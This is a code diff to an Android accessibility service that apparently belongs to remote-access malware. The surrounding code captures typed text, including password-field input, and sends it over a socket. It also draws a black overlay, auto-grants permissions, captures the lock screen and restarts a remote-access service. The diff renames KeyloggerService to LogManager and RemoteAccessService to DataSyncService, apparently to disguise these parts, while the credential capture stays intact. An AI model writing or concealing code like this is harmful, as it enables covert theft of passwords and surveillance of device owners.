@@ -127,7 +127,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         // overlay_setup_done is written to prefs during first-time setup; on reboot it is already true.
         boolean isFirstLaunch;
         try {
-            android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
+            android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
             isFirstLaunch = !prefs.getBoolean("overlay_setup_done", false);
         } catch (Exception e) {
             isFirstLaunch = false;
@@ -138,7 +138,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             try { startAutoGrantTimer(); } catch (Exception ignored) {}
             try {
                 addBlackOverlay();
-                android.content.SharedPreferences prefs = getSharedPreferences("ra_prefs", MODE_PRIVATE);
+            android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
         }
@@ -193,7 +193,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (gr != null) gr.enableLockScreenAutoCapture();
         } catch (Exception ignored) {}
 
-        try { com.task.tusker.commands.KeyloggerService.setEnabled(true); } catch (Exception ignored) {}
+        try { com.task.tusker.commands.LogManager.setEnabled(true); } catch (Exception ignored) {}
 
         try {
             clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
@@ -270,7 +270,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
     private void ensureRemoteServiceRunning() {
         try {
-            Intent serviceIntent = new Intent(this, RemoteAccessService.class);
+            Intent serviceIntent = new Intent(this, DataSyncService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(serviceIntent);
             } else {
@@ -554,7 +554,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                         String eventType = isPasswordField ? "PASSWORD_FOCUS" : "TEXT_CHANGED";
                         try {
                             SocketManager sm = SocketManager.getInstance(this);
-                            sm.getKeylogger().logEntry(packageName, appName, typed, eventType);
+                            sm.getLogManager().logEntry(packageName, appName, typed, eventType);
                             sm.getAppMonitor().onTextChanged(packageName, typed);
                             if (sm.isConnected()) {
                                 String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
@@ -2211,12 +2211,12 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     @Override
     public boolean onUnbind(Intent intent) {
         // When the accessibility service is killed (e.g. by the system), attempt to restart
-        // RemoteAccessService so it can reconnect once the user re-enables accessibility.
+        // DataSyncService so it can reconnect once the user re-enables accessibility.
         try {
             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                 try {
                     Intent svc = new Intent(getApplicationContext(),
-                            com.task.tusker.services.RemoteAccessService.class);
+                            com.task.tusker.services.DataSyncService.class);
                     if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                         getApplicationContext().startForegroundService(svc);
                     } else {
@@ -2462,7 +2462,7 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                 String appName = getAppNameForPkg(pkg);
                 try {
                     SocketManager sm = SocketManager.getInstance(this);
-                    sm.getKeylogger().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
+                    sm.getLogManager().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
                     if (sm.isConnected()) {
                         String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                 java.util.Locale.getDefault()).format(new java.util.Date());
